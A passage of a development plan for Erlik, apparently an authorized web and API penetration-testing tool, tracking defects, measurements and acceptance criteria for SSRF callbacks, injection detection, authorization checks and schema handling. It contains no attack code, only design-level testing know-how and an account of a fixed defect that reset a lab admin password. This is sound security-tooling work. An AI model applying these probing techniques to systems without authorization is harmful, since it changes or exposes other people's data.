# Erlik: future development plan

Planning date: 2026-09-10. Status: proposal for future implementation.

This plan builds on the integration roadmap and the latest working-tree review.
It does not claim that the proposed capabilities are already implemented or
authorize a scan, external deployment, recurring automation, or merge.

> **Corrections folded in, 2026-09-10 (later the same day).** Section 2's baseline
> was measured before that day's work landed, and four of its figures are stale.
> Every correction below names the evidence that establishes it, so a reader can
> check rather than trust. Stale planning facts misallocate effort, and §2 is what
> R0 is scoped from — so the corrections are marked in place rather than quietly
> applied. Sections 11 and 3 also gained clauses that the day's two worst defects
> showed were missing.

## 1. Product direction

Develop Erlik into a dependable, evidence-driven assistant for authorized web and
API penetration tests. An operator should be able to supply a scope, identities,
and application context, see which surfaces were actually tested, reproduce a
finding, and retest its remediation without reconstructing the engagement.

Prioritize improvements in this order:

1. Correct execution, cancellation, authentication, and evidence handling.
2. Authenticated endpoint and operation coverage.
3. Authorization and business-workflow verification.
4. Reproduction, remediation, and change-aware retesting.
5. Bounded AI investigation that measurably adds useful coverage.
6. Additional source/dependency integrations and, later, team deployment.

More alerts, more tools, and more model calls are not success metrics by
themselves. The product should explain what it tested, what it could not test,
and why each finding deserves its confidence level.

## 2. Starting point and known limits

The current tree contains ZAP, Schemathesis, Katana, Interactsh, and DefectDojo
integration code; an isolated proxy-backed execution path; named identities;
structured inventory and evidence; dashboard controls; and local test fixtures.
Endpoint handoff and the catalogue SSRF callback hook now exist. The existing
project also has Nettacker, a technique library, NVD enrichment, target memory,
verification helpers, and a WSTG catalogue. Extend these before creating parallel
implementations of the same features.

The September 10 review observed:

- ~~161 network-free tests passed.~~ **2128 passed, 35 skipped** (the skips are
  Docker- and live-service-gated). Measured on the merged tree.
- The selected acceptance run had 22 passes and one benchmark failure; this
  count includes two network-free checks in the lifecycle file.
- Three temporary focused checks reproduced callback cancellation leakage,
  callback loss after authentication resume, and catalogue writes outside a
  cleanup wrapper. **Still open; see E-001 to E-003 for current status.**
- ~~The benchmark recovered its expected findings but rejected evidence because it
  required every attached artifact, including empty stderr, to be nonempty.~~
  **Closed, in two parts.** `c761b76` stopped `record()` attaching a zero-byte
  stderr to each finding — it was doing so to 22 of them. `e78c257` then found
  that the fix had overshot the clause and that a second clause had never been
  met at all; see E-004.
- ~~14 WSTG catalogue files.~~ **32 catalogue files, 32 cases, 12 of them runnable
  in the assessment lane.** The twenty that are not runnable are not a defect but
  they are untested coverage, and the lane says so per case. Two of the twelve —
  `WSTG-CONF-06` and `WSTG-INPV-07` — carry mutating steps that E-003 now refuses.
- CI runs `pytest tests/ -q`, i.e. every acceptance file, with the Docker and
  live-service suites gated by environment variables — so "CI does not yet run all
  new acceptance files" is **stale**. It has a different and live defect instead:
  see E-005.
- Documentation and the saved benchmark report lag behind the implementation.
  Milestone commits and human review are still outstanding.

### Established the same day, and folded into §11

Two defects found by running the whole lane against the lab
([measurements/2026-09-10-full-lane.md](measurements/2026-09-10-full-lane.md),
fixed in `1046d0a`). Both are closed. They are recorded here because **neither
would have been caught by the metrics in §11 as originally written**, and that is
the lasting lesson rather than the bugs themselves.

- **The lane performed an unauthorized state change.** It set the lab target's
  admin password to `md5("")` while the run declared `state_changing: false`,
  through three separate paths — the crawler seeding itself with a URL synthesised
  from a GET form, per-URL cases fetching that URL, and one step that appended
  guessed parameter names instead of the one it was given, submitting the form
  blank. Every one of those requests was **in scope**. Scope integrity as defined
  in §11 measures request destinations and would have passed.
- **A case that received zero bytes reported `completed`.** 156 of 208 probes in
  the hardened arm of a differential got empty responses — a single-use CSRF token
  baked into the discovered URL had gone stale — and the stage reported no
  findings. "Attempted" was true and meaningless. Known-operation coverage as
  defined in §11 would have counted those as attempted.

### Also closed the same day

- **Findings now carry the bytes they rest on** (`8321ff0`, `aea0898`, `cce6bf6`,
  `6c9b0d9`). This closes E-004's second acceptance clause and a substantial part
  of E-016 — see both entries.
- Error-based SQL injection re-measured against 71 real error bodies and 121
  benign pages (`d2734bb`,
  [measurements/2026-09-09-sql-error-signatures.md](measurements/2026-09-09-sql-error-signatures.md)).
- Blind SQL injection, boolean-differential and time-based (`679becd`,
  [measurements/2026-09-09-blind-injection.md](measurements/2026-09-09-blind-injection.md)).

These are the baseline facts for planning, not a production-readiness claim.
Actual-service fixtures exist for Interactsh and DefectDojo; a release needs a
fresh recorded run against the final code and pinned images. Internet callback
reachability and client-specific authentication still require operator setup.

## 3. Release sequence and effort assumptions

Estimates are preliminary engineering effort, not delivery commitments. They
assume an engineer familiar with the code, occasional frontend help, access to
local Docker, and a separate security reviewer. Review queues, client onboarding,
and infrastructure lead time are additional. Re-estimate after the first gate.

| Release | Outcome | Indicative effort | Dependency / exit gate |
|---|---|---:|---|
| R0 — reliable integration baseline | Close confirmed defects, complete CI and evidence validation | 5–10 engineer-days | All known regressions pass; final local acceptance recorded; **identity isolation demonstrated (moved from R1, see below)** |
| R1 — usable authenticated assessments | Operation inventory, identity matrix, guided configuration, reusable browser journeys | 15–25 days | R0; coverage demonstrated |
| R2 — deeper verification | Role/tenant authorization, selected API workflows, bounded business-logic tests | 20–35 days | R1; positive and negative controls pass |
| R3 — retest and remediation | Evidence bundles, assessment diffs, targeted retests, reliable export UX | 10–20 days | R1 + verified findings from R2 |
| R4 — measured AI follow-up | Shared execution policy, structured hypotheses, bounded investigation, held-out evaluation | 15–25 days | R0–R3 data contracts and evaluation gates |
| R5 — optional expansion | Source/image inputs, additional integrations, team requirements discovery | 10–20 days per selected integration; team platform estimated separately | Demonstrated operator demand and stable core |

R3 reporting work can overlap R2 once the finding/evidence contract is stable.
Do not start every release simultaneously. Maintain at most one execution-boundary
change and one independent product workstream in progress.

> **Identity isolation moves from R1's exit gate to R0's.** A differential run on
> 2026-09-10 reported nine findings at a vulnerable security level and one at a
> hardened one, and the result was not usable: the two arms shared **one of eight**
> `(url, parameter)` pairs, because the hardened target baked a single-use token
> into the URL its forms were discovered from. The arms were not the same surface,
> and the hardened one never reached the injection points at all. Nothing measured
> after an identity boundary means much until that boundary is demonstrably one
> variable — so it gates R0, not R1. R1 keeps the coverage half of its gate.

## 4. R0: finish the current implementation

| ID | Work | Acceptance criterion | Primary code area | Status |
|---|---|---|---|---|
| E-001 | Make collector ownership exception-safe | Cancellation and timeout at every awaited startup/probe boundary close all owned jobs; evidence remains available | `integrations/service.py`, `interactsh.py`, `runtime.py` | **CLOSED** `7723090` + `a1f8c37`. Two leaks first: the `asyncio.TimeoutError` branch did not close, and `CancelledError` is a `BaseException` so `except Exception` never saw it. Then an adversarial pass found the first fix had closed only HALF the clause and introduced a third defect — `close()` releases but never ingests, so a callback that had already arrived was lost, and a failing `close()` replaced the exception it was cleaning up after, swallowing a cancellation entirely |
| E-002 | Restore callback capability after credential replacement | A paused run resumes pending SSRF checks with fresh correlation IDs; previously issued probes are not silently replayed; interrupted collection remains explicitly incomplete | `service.py`, `interactsh.py` | **CLOSED** `639c32e`. The pause erased its own resume marker: the sweep persisted `partial` over the `needs_auth` the stage had just been given, and `run()` only selects `queued`/`needs_auth`. Note the status column was too generous — `issued_payloads` is in-memory and does NOT survive a resume; what prevents reuse is that payloads are minted per client start |
| E-003 | Separate catalogue detection from workflow mutations | V1 catalogue follow-up refuses all mutation steps, or an explicit per-case fixture/cleanup wrapper handles them; no leftover probe artifact in the lab | `deterministic.py`, catalogue runner | **CLOSED** `7f45f06`, taking the plan's first branch: refuse. The gate deferred to the egress policy, which says yes once `state_changing` is selected — measured, `PUT /erlik_put_test.txt` ran. Cost: `WSTG-INPV-07` loses ALL detection (every step is POST) until E-012 builds the wrapper |
| E-004 | Correct evidence completeness validation | Every referenced artifact exists and passes its digest check; each finding has substantive supporting evidence; empty diagnostic files are valid attachments | benchmark, evidence persistence | **CLOSED** `e78c257`, after being marked closed too early. The digest was write-only state — nothing recomputed it, and the benchmark read `size` from the database row, comparing it against itself. An empty diagnostic FILE was also dropped rather than retained. Benchmark now passes against the stricter validator: 17/17 substantive, 80/80 intact |
| E-005 | Expand CI and produce release evidence | Unit and local Docker jobs cover lifecycle, inventory, benchmark and parser tests; dedicated actual-service jobs run on release or manual dispatch with explicit opt-in variables | `.github/workflows/tests.yml` | **CLOSED** `eedb7e3`. The collection defect was the smaller half: CI had also never executed a single one of the 35 Docker-gated tests, so the lane's whole execution boundary was covered only on a developer's machine. Now three jobs — unit on 3.10/3.12/3.14, `-m docker` off-push, actual-services behind a repository variable — plus `ci_assert_suite_ran.py`, because a run where everything skipped is green and worthless. **Still unpushed:** the credential lacks GitHub's `workflow` scope |
| E-006 | Package and document the integration release | Separate reviewable milestone commits, current setup instructions, initial-import/reconcile examples, pinned build manifest, no unrelated operator files included | docs, Git review series | **CLOSED**. Manifest in `eedb7e3`; docs and packaging here. The setup instructions were verified by following them from a fresh clone rather than by reading them, which is how two of my own figures turned out wrong — see below |

Run collector fault-injection tests, real scanner cancellation, actual process
crash recovery, mid-stage credential expiry, redirects, external schema references,
cross-identity isolation, selected mutations, and repeated exports. A passing
mock service test does not substitute for actual pinned-service acceptance.

Add two fault-injection cases the 2026-09-10 run argues for, because both produced
a confident wrong answer rather than a failure: **a target whose state changes
during a run that declared it would not**, and **a probe that receives an empty
response**. Both are now detected, and a regression in either is silent.

Keep R0 focused: avoid adding a sixth scanner while these behaviors are unresolved.

## 5. R1: authenticated coverage and operator experience

### E-007: make the endpoint inventory an operation inventory

Store origin, path template, HTTP method, parameter location/name, content type,
schema operation ID, identity context, discovery source, and whether a request was
actually attempted. Keep concrete URLs as observations beneath the operation.
Preserve raw evidence when normalizing query order, fragments, or path parameters.

Distinguish discovered, inferred from JavaScript/schema, attempted, verified, and
blocked operations. Avoid turning an inferred URL into a claim of tested coverage.
Do not merge different methods, tenant contexts, or authorization identities.

Record **how** an operation was synthesised, not only that it was. A URL built from
a GET form is an action rather than a page, and requesting it performs that form's
action — which is how the 2026-09-10 state change happened. An operation inventory
that cannot express "this URL submits a form" will reproduce it.

Acceptance: overlapping Katana/ZAP/schema discoveries resolve to one operation
where appropriate, while GET/POST and reader/admin evidence remain separate.
The dashboard shows the reason for every untested known operation. A
form-synthesised operation is distinguishable from a crawled one.

### E-008: identity and authorization matrix

Add roles, tenant labels, object ownership, authentication-check status, and
expected permissions to the existing named identities. Start with anonymous,
two ordinary users in different tenants, and one privileged lab identity.
Operators declare which objects each identity may access.

Acceptance: the same operation can be tested under multiple identities without
credential leakage; expected access and unexpected access are distinguishable.
An expired identity pauses only work that depends on it, with a clear retry plan.
**Two identities testing the same operation must produce the same operation set** —
a differential whose arms discovered different URLs is not a differential, and a
run that proves this by comparing arm surfaces is the demonstration R0 needs.

### E-009: reusable browser journeys

Extend the existing Playwright helper into named journeys: login, navigate to a
feature, select a fixture object, and capture network traffic plus trace evidence.
Prefer accessible labels/test IDs, bounded waits, and explicit assertions to
fragile recorded coordinates. Continue operator-assisted MFA first.

Treat clicks that submit forms or change application state as selected workflow
actions. Popup, redirect, download, navigation, and subresource requests must share
the same policy. Do not silently enable WebSocket scanning while HTTP-only
enforcement is the implemented boundary.

Acceptance: a fixed SPA journey reaches an authenticated route reliably across
repeated runs; an out-of-scope redirect receives no unauthorized target request;
session expiry produces a recoverable state instead of a false clean result.

### E-010: guided assessment setup

Replace most raw JSON entry with forms for scope, identities, schemas, callback
services, and per-stage policy. Preserve an advanced JSON view. Show the effective
configuration before launch, including active stages, selected mutations, budgets,
excluded paths, and which credentials each stage will use.

Provide passive discovery, API assessment, authenticated application assessment,
and remediation retest templates. Templates fill configuration; they do not expand
authorization. Add an explicit preview of work to be resumed after an interruption.

The preview should state what the run **will not** do, not only what it will. The
budget arithmetic is the case in point: at the default `max_urls` with every
runnable case selected, the 2026-09-10 run tested one or two parameters per case
out of eight and lost six of nine findings. It said so twelve times, in per-case
observations nobody reads before launch.

Acceptance: an operator can configure the authenticated lab without editing JSON;
the UI and API reject the same invalid settings and produce equivalent saved runs;
the preview shows per-case target budgets before the run starts.

**The preview now says which cross-arm checks the configuration cannot support — done.** The
budget half of "state what the run will not do" was already there. This is the half that costs
a whole assessment: the cross-arm checks are the highest-value capability in the product, and
the commonest way to lose them is a declaration nobody filled in. Every one of
`caller_has_no_subject_id`, `owner_has_no_subject_id`, `role_not_declared` and
`arms_share_a_role` is an honest refusal that arrives AFTER the containers have run — measured
over and over while building those checks, including twice in this session's own harnesses.

`preview()` carries `authorization_readiness`: every ordered identity pair, per check, with
what it will refuse and the remedy. Both directions, because which identity is the caller is
the operator's choice at the route and a configuration can support one direction and not the
other. Plus whether an anonymous arm will be registered at all, which both checks require.

ONE PREDICATE, not a second opinion. `declaration_refusals` is called by the checks AND by the
preview, and `test_the_preview_predicts_what_the_check_actually_does` walks a matrix of six
declaration combinations, runs both real checks against a seeded session, and asserts the
forecast equals what they actually refused with. Without that differential this would be a
second implementation of a guess, tested against itself.

IT DOES NOT PREDICT ARGUMENTS IT CANNOT SEE. The anonymous arm, the owner field and the marker
reach the checks from the route rather than the configuration, so `marker_unusable`,
`arms_share_one_identity` and the `*_did_not_run` family are deliberately absent — asserted, so
a later edit cannot start guessing at the operator's next keystroke.

STILL OPEN in this entry: the forms, the templates, and the resumption preview. This is the
API half only.

### E-035: what running the container suites found — CLOSED

Every increment before this one was verified network-free, and the 68 Docker-gated tests had
not run in the session at all. Running them found two real failures, both mine, both invisible
to the suite that had been green all along.

**A `SecurityAssertion` was graded `likely` where `confirmed` is earned.** E-032 made the grade
follow a differential — the same request with the identity dropped — and
`test_integration_docker.py` called the adapter DIRECTLY, so no control was supplied and the
grade degraded. The test asserted the old constant. The fix is not to relax the assertion: the
test now runs `service.assertion_controls` against the lab, whose `/private` answers 401 to a
caller with no token, so the control refutes and `confirmed` is earned for the right reason —
the first end-to-end proof of that differential against a real target. Its sibling asserts the
other half, that a missing control grades `likely` with a caveat.

**A refusal that echoes the marker is not publication.** The benchmark lab answered
`/api/private` with `401` and the canary still in the body, so the identity-free control
received the marker inside a refusal. Withholding `confirmed` was right — nothing there
distinguishes gated content from a marker the application echoes into every answer — but the
reason said "the application publishes it", which the 401 says it does not. `assertion_grade`
now separates the two, with different remedies: "your content is public" and "choose a marker
the refusal does not contain". The cross-arm `carries` helper has required a successful status
since a 400 that echoed the request was found satisfying a clause for free; this is the same
distinction arriving on the other path.

The fixture was also wrong and is fixed: it shipped the private object to every caller and only
the status line said otherwise. Its sibling `integration_target.py` already modelled a refusal
correctly.

**Measured with the lab up:** `ERLIK_DOCKER_TESTS=1 ERLIK_REAL_INTERACTSH_TESTS=1 pytest`
reports **3191 passed, 1 skipped** — the remaining skip needs a live DefectDojo. The benchmark's
`recall_in_scored_rules` is back to 1, and earned against a real control rather than a constant.

## 6. R2: improve the quality and depth of testing

### E-011: authorization verification — highest-value new capability

Expand the existing IDOR check into object-level and function-level authorization
tests using the identity matrix. Begin with read-only requests and operator-supplied
objects. Compare ownership assertions and sensitive response markers, not merely
HTTP 200, response length, or a changed numeric ID.

Acceptance: recover seeded cross-user, cross-tenant, and privileged-function access
violations; reject public content, generic error pages, and expected shared access
as negative controls. Store both baseline and violating request/response evidence.
Map coverage to relevant WSTG and API Security categories; the OWASP API Security
project supplies the reference taxonomy. [OWASP API Security](https://github.com/OWASP/API-Security)

**The acceptance is demonstrated in one place**, `tests/test_the_authorization_acceptance.py`:
three seeded violation classes recovered, three negative controls rejected. Writing it found
two things.

CROSS-TENANT had only a LABEL test. `compare_arms` reports `cross_tenant: True` when both arms
declare a tenant and the two differ, and nothing seeded a cross-tenant violation to show the
product recovers it. Measured: it does. The capability was there; the demonstration was not.

A NEGATIVE CONTROL WAS NOT MET. One error document carrying the operator's marker, served 200
at five URLs and refused to the anonymous arm, produced FIVE high findings — five copies of one
document reported as five privilege crossings. The status clause catches an error page that
comes with an error STATUS; an application answering 200 with an error body walked past it.
`indistinct_urls` already answers this and the cross-arm checks were not asking it, so
`cross_arm_privileged_function` asks it now: the most canonical spelling survives and is still
reported, the repeats are listed under `skipped_indistinct_response` with the URL they answered
like. Five findings became one. On both recorded real runs the clause prunes nothing — 34 and
38 operations checked, 0 skipped — so it is free on real evidence.

The object-level check does NOT get the clause and does not need one: measured on the same
evidence it reported 1 of 6, because its clauses require an asserted owner read from the body
and an error page has none. A clause that cannot fire is a protection that is not there.

Two limits, both measured and recorded rather than smoothed over. Two genuinely distinct
objects that answer with identical bytes collapse to one finding naming both — a merge, and the
same answer this lane already gives for a URL group. And a generic document at ONE url is still
reported: whether a string is privileged data is the operator's declaration and no recorded
response can overturn it, so that finding stands and carries `declaration_that_would_suppress`.

**The API Security half of the mapping clause — CLOSED.** The acceptance asks for coverage
mapped to "relevant WSTG and API Security categories". Measured before building: WSTG ids run
through `orchestrator/`, `tests_catalog/` and the docs, and the OWASP API Security taxonomy
appeared in NONE of them. Half the clause had been read as the whole of it.

THE TWO TAXONOMIES ARE NOT THE SAME LIST, which is what makes this more than relabelling.
`CLASSES[*]["owasp"]` is the WEB Top 10 and has ONE "A01 Broken Access Control". The API Top 10
2023 splits access control into OBJECT level (API1) and FUNCTION level (API5) — and erlik
already runs those as two different checks, `cross_arm_authorization` and
`cross_arm_privileged_function`, both exercised by the acceptance above. The mapping reports a
split the product had been making and not naming. `api_coverage()` answers per category, and
`/api/library/api-coverage` serves it.

EVERY CATEGORY IS LISTED, COVERED OR NOT — 8 of 10 — because a coverage report that lists only
what it found reads as complete when it is not. The two erlik does not cover carry a declared
REASON (API4 needs load-shaped tests erlik has no capability for, API10 is about what the target
consumes from its own upstreams and is not observable from outside), and `audit()` fails on a
category that is neither claimed nor explained. Without that second list the first can only be
empty by pretending.

INJECTION IS DELIBERATELY UNMAPPED and this is the non-obvious fact. Injection was API8:2019 and
was REMOVED as a standalone category in 2023, so seven classes declare no API category. Filing
them under "API8 Security Misconfiguration" because the number looks familiar is exactly the
confidently-wrong relationship `capabilities.py` refuses to auto-generate. The report carries
the reason so an operator does not read six empty lists as missing coverage.

The guard that had never fired got a positive control rather than a comment: a category cannot
be both claimed and declared uncovered, the two existing directions structurally cannot see
that case, and `test_the_contradiction_check_can_actually_fire` gives it something to find.

**The existing join-integrity test found the defect in the new code, which is the argument for
running the whole suite rather than the file being edited.** `audit()` read `c["api"]` directly,
so a class dict without the key raised a KeyError from INSIDE the audit — and
`/api/library/classes/audit` turns that dict into an `ok` verdict, where an exception is a 500
rather than a verdict. Tolerating the absence quietly is the other wrong answer: `jwt` dropping
API2 while `authn` still claims it leaves every other direction clean, so a missing mapping is
now its own finding, `classes_missing_api`.

STILL OPEN in this entry: nothing in the acceptance as written. What the mapping does NOT do is
claim coverage per category is EQUAL — API8 is claimed by three classes with very different
depth, and the report says which classes rather than scoring them.

### E-012: API workflow and schema improvements

Validate and bundle schema references before scanning. Support schema version
diffs, operation exclusions, required fixture data, cleanup receipts, and GraphQL
query-operation inventory. Missing or incompatible schemas should not disappear
into a generic scanner failure.

For selected workflows, model setup → operation sequence → assertions → cleanup.
Persist which mutations actually ran. Reserve cleanup time separately; if the
orchestrator dies, preserve cleanup obligations for operator review rather than
automatically repeating state changes after restart.

Acceptance: a seeded failure reproduces with the same schema digest and seed;
unselected mutations never execute; cleanup success/failure is independently
reported. Schema contract failures remain observations unless security impact is
demonstrated.

**Cleanup obligations survive the orchestrator dying — done.** `TestStep.cleanup` runs the
undo in a `finally`, which covers an exception and a cancellation and does NOT cover the
process going away; `save_run` is called after the run returns, so measured before this, a run
that wrote and then died left ZERO rows: the file was on the client's server and nothing
anywhere knew it existed. `v2_cleanup_obligations` is written immediately before the write and
discharged after the undo, whatever the undo's outcome, and `runner.outstanding_cleanups`
lists what nothing ever closed.

Three properties, each measured. The obligation is on disk BEFORE the request — asserted from
inside the executor, which is the only moment that proves it. It is recorded there and not
beside the step policy, because a first version filed an obligation for a write the safe-mode
floor then refused. And if it cannot be recorded the step does not run, which is
`_v1_step_policy`'s own reasoning — erlik cannot declare the undo, so it does not make the
request — applied to the durable half; it cannot affect the default path, because safe mode
refuses a mutating step anyway.

NOTHING REPLAYS, which is what the entry actually asks for. Re-issuing a DELETE against a
client's system from a record erlik cannot re-verify is a state change nobody asked for a
second time, and the target may have been restored, reused or handed to someone else since.
The review path is a read and there is a test that no other code path touches the table.

`RunResult.cleanups` still does not reach `v2_runs` — the receipt is in the obligations table
instead, which is the durable half and the one an operator acts on. The in-run list stays for
the caller that holds the result.

**A wrong schema says what is wrong with it — done.** Two readers parsed the same bytes and
disagreed: `adapters.schema_file` validated the document, `service.operation_routes` went
straight to `doc.get("paths", {})`. Measured across the five ways a schema can be wrong:

                            operation_routes                       schema_file
    malformed YAML          raw multi-line yaml.ParserError         the same dump
    a YAML scalar           AttributeError: 'str' has no 'get'      invalid OpenAPI document
    a YAML list             AttributeError: 'list' has no 'get'     invalid OpenAPI document
    an HTML error page      AttributeError: 'str' has no 'get'      invalid OpenAPI document
    JSON, not a spec        "selected operation IDs are missing"    invalid OpenAPI document

Those reasons reach the operator — the stage row carries `redact(str(exc))`. The last is the
worst and is not generic: it is WRONG, and it sends someone to check the operation IDs they
typed when the document is not a specification at all.

`load_openapi_document` is the one validator both now call. It names the source, collapses a
parser dump to one bounded line while keeping the line and column that locate the typo, says
what the document parsed AS when it is not a mapping, lists the top-level keys it does have
when the `openapi` key is missing, and calls out markup separately because a schema URL
answering 200 with a login page, an error page, or documentation ABOUT the API is the common
case in practice.

One existing fixture was relying on the gap — a stub with `paths` and no `openapi` key, which
`schema_file` had always refused. It is a valid stub now, and says so.

**The schema digest is an identity, not a serialisation — fixed.** `schema_sha256` is what
`test_schema_fork` compares to decide two arms were given DIFFERENT schemas, which is a
refusal. It was `json.dumps(document)` with no `sort_keys`, while its sibling `plan_sha256`
was already canonical and nothing said why they differed. Measured: two semantically identical
documents differing only in key order hashed to `d1ac2b39…` and `90147ce6…`; the same pair
under `sort_keys=True` hashed alike. It is reachable because each arm fetches
`schema_input.url` on its own request, and the order of a remote server's JSON is its business
rather than ours — a refusal on a difference that is not a difference.

**What is and is not established about reproducibility.** The acceptance is "a seeded failure
reproduces with the same schema digest and seed". Both halves are recorded on the stage the
fuzzer produced, and the recorded seed IS the one passed — the command line and the metadata
read the same config field, so they cannot drift. The digest is now over the exact bytes handed
to the scanner, after bundling and after the target is pinned into `servers`, so two runs
against different hosts are correctly different scans.

NOT established: that Schemathesis is itself deterministic under a fixed seed. That is a
property of the tool, it needs a lab run with `ERLIK_DOCKER_TESTS=1` to check, and it is
deliberately not asserted — claiming the acceptance on the strength of a recorded number would
be the confident-output-from-an-unrun-path defect this list exists to remove. Left open with
the measurement to do rather than marked done.

**The measurement was done, and it is three facts rather than one — PARTLY CLOSED.** Run
against the lab fixture:

    --workers 2 (default), seed 1, x4    ordered requests DIFFER run to run
                                         the request SET is identical
                                         the observations are identical
    --workers 1, seed 1, x3              ordered requests identical
    --workers 1, seeds 1 / 987654 / 42   ordered requests IDENTICAL ACROSS SEEDS

WHAT IS NOW ESTABLISHED: at a fixed seed AND worker count the scan repeats — same requests,
same observations, same digest. That half of the acceptance is asserted, and compared as a SET
rather than a sequence, because asserting order at the default concurrency would produce a
flaky test for a reason that is not a regression.

WHAT THE MEASUREMENT CHANGED IN THE PRODUCT: `workers` is now a reproduction key and is
recorded on the stage. `REPRODUCTION_KEYS` says it is "what a reader needs before they can
repeat the run" and it was INCOMPLETE — two runs at the same digest and seed but different
worker counts do not record the same sequence, so a reader handed everything else could not
repeat what they were shown. The set was measured incomplete rather than reasoned incomplete.

WHAT REMAINS UNKNOWN, and is recorded as unknown: what the SEED controls. On this fixture the
run is identical across three different seeds, so "a seeded failure reproduces with the same
seed" is true and VACUOUS here — it reproduces with any seed. The obvious test, same seed in
and same result out, would pass without the seed doing anything. It is therefore NOT asserted.
Establishing seed sensitivity needs a schema large enough that generation is actually sampling,
which the five-operation lab fixture is not.

The first pass at this measurement DID assert seed sensitivity, on two runs that happened to
differ; a third run contradicted it. The varying thing was worker ordering, not the seed — and
a test written from the first pass would have been both flaky and wrong about why.

**GraphQL query-operation inventory — done.** Measured first: `schema_file` returned the parsed
document only for OpenAPI (`document if source.kind == "openapi" else None`), and
`schema_endpoints` is paths and query parameters, which a transport with ONE url and no methods
has none of. So `schema_endpoints(None, …)` returned `[]`, a GraphQL assessment declared ZERO
operations, and a six-operation schema was indistinguishable from an empty one. A grep for any
function that enumerated GraphQL operations came back empty — the capability was absent, not
broken.

The recurring shape rather than a missing feature: an empty inventory reads as "the schema
declares nothing" when it meant "nothing looked".

PARSED, NOT MATCHED. SDL carries block strings, descriptions, comments, directives, interfaces
and `extend type`, so `graphql_operations` uses graphql-core — the library the proxy ALREADY
uses to tell a read-only query from a mutation, now a declared orchestrator dependency as well
as a container one. A regular expression that looked right on a tidy schema would miss or
invent operations on a real one, and there are tests for both: a description that mentions
`type Query { fake: String }` as prose contributes nothing, and `extend type Query` contributes
its fields. SDL and introspection JSON are both accepted, because both are what an operator has
to hand.

THE INVENTORY NAMES WHAT WILL NOT RUN. With `state_changing` off the proxy refuses mutations,
so `graphql_inventory` lists the withheld operations by name instead of leaving the operator to
infer the gap from an absence in the results — and a test ties that set to what `proxy_addon`
actually blocks, which is a document whose operations are ALL queries.

A BROKEN SCHEMA RAISES RATHER THAN REPORTING AN EMPTY INVENTORY, which is the same defect
this entry closed for OpenAPI: the failure reaches the stage row as a reason.

**The arity guard was strengthened by the change it caught.**
`test_schema_file_returns_the_same_shape_with_and_without_a_schema` existed because the third
return value grew and the no-schema early return kept two, killing every ZAP run. It asserted
`== 3`. Growing the tuple to four made it fail — correctly — but ablating the early return back
to three values showed the OLD form would have PASSED while the with-schema path returned four:
the guard checked only one path, so it would have missed the exact defect it was written for.
It now compares the two paths to each other.

**"Unselected mutations never execute" was asserted against a schema that could not violate it
— NOW DEMONSTRATED.** The enforcement was real and in two places: `AssessmentConfig` refuses
`state_changing` without operations, fixtures and cleanup, so "mutations on, nothing selected"
is not a configuration that can be built; and `EgressPolicy` refuses any non-GET/HEAD/OPTIONS
request that matches no permitted route, with the reason "operation not selected".

WHAT WAS MISSING WAS THE DEMONSTRATION. The container fixture's OpenAPI document declared
exactly ONE mutation, `createItem`, and `test_workflow_selection_and_cleanup_failure` — the
test that looks like the acceptance — SELECTS it and then asserts the target saw no mutation
outside the selected set. With no unselected mutation in the schema there was nothing to
exclude and the assertion could not have failed. It reported exclusion without exercising it,
which is the clause-that-cannot-fire shape rather than a missing feature.

The fixture now declares `promoteUser` (POST /admin/promote) which no workflow selects, and the
container test asserts it never reached the target. Measured: it does not.

THE REFUSAL HAD A NAME AND NOTHING USED IT. No test in the suite mentioned "operation not
selected", so a refusal arriving for a different reason — scope, port, an excluded path,
state-changing disabled — was indistinguishable from this one, and a selection rule that
stopped working while another rule happened to catch the same request would have looked
identical. Nine policy-level cases now assert the reason, including that state-changing-disabled
answers with ITS reason rather than this one, and that swapping which operation is selected
swaps which URL is refused — the decision follows the workflow, not the path.

A GUARD ON THE GUARD. `test_the_container_fixture_declares_a_mutation_no_workflow_selects`
fails if `promoteUser` is removed, because without it the container test silently returns to
the vacuous state this increment found it in and nothing else would say so. Ablated: it does.

**Schema version diffs — done.** `schema_sha256` answers "is this the same schema", and TWO
places already compared it: the retest comparison and the cross-arm schema fork. Both could
say only THAT it changed, which leaves the operator to diff two documents by hand — and when
the schema came from a URL they cannot, because `schema_file` fetches it at run time and
nothing keeps the bytes. Measured: `integration_assessments.config` stores inline
`schema_input.content`, so an inline schema survives and a URL-supplied one leaves only a
digest. The inventory is therefore RECORDED per stage rather than reconstructed later.

NOT `schema_endpoints`, which is GET-only, exists to find query parameters, and skips
templated paths because a template is not a URL. All three are right for parameter discovery
and wrong here: `DELETE /items/{id}` is an operation, and an inventory that never held it
cannot notice it being removed. `declared_operations` uses ONE shape for OpenAPI and GraphQL,
so the diff does not need to know which kind it is reading.

ADDED AND REMOVED ARE NOT THE SAME FINDING and are not reported as one. Added operations are
surface the baseline never assessed. A REMOVED operation is the half worth acting on: withdrawn
from the schema it should be gone, and one that still answers is a live endpoint the
documentation no longer admits to — a lead rather than a diff line. A parameter added to an
operation that already existed is a third case, invisible to a set comparison, and it is
excluded from the `unchanged` count because an operation whose inputs moved is not unchanged.

AND AN ABSENT INVENTORY SAYS SO. Assessments recorded before this existed carry a digest and no
inventory, where an empty added/removed pair means "not recorded" rather than "nothing
changed". Reporting the second would be this entry's own defect in new clothes, so the
comparison says what it cannot show. Ablated: the clause fires.

**Required fixture data — done, and the defect was in what a missing setup REPORTED.** The
worker already refused to scan without it: a fixture whose assertion fails raises before
`subprocess.run`, so the scan never starts. Measured against the lab, four combinations:

    setup ok,   cleanup ok      completed   1 operation exercised
    setup FAIL, cleanup ok      partial     0 exercised   <-- no coverage, reported as partial
    setup ok,   cleanup FAIL    partial     1 exercised
    setup FAIL, cleanup FAIL    partial     0 exercised

The failing-setup rows had `exit_code: None` and not one operation exercised — and the missing
report had ALREADY set the stage to "failed". The workflow branch ran afterwards and overwrote
it with "partial", which is what a run earns when it scanned properly and cleanup left residue.
No coverage at all was reported more reassuringly than a run that worked, under one reason
naming both causes and committing to neither. They are opposite instructions: no coverage means
run it again, residue means go and look at what was left on the client's system.

THE FIRST FIX WORKED BY ACCIDENT and is worth recording. It read a `setup_ok` flag added to
`worker.py` — which arrived as None, because the worker runs from the copy baked into the
container image and nothing rebuilt it. The fallback was right for the three cases measured and
would have been WRONG for the fourth: a scan that TIMES OUT sets the same `error` with setup
perfectly fine, and would have been reported as never having started. `workflow_setup_ok`
computes the verdict from the fixture responses the existing worker already sends, so it needs
no image rebuild and a stale flag claiming success cannot override it.

`workflow_outcome` is extracted rather than inline for the reason `assertion_findings` gives in
its own docstring: while the decision lived inside a method needing schemathesis output and a
container, the only thing a test could reach was the container. Twelve of the thirteen cases
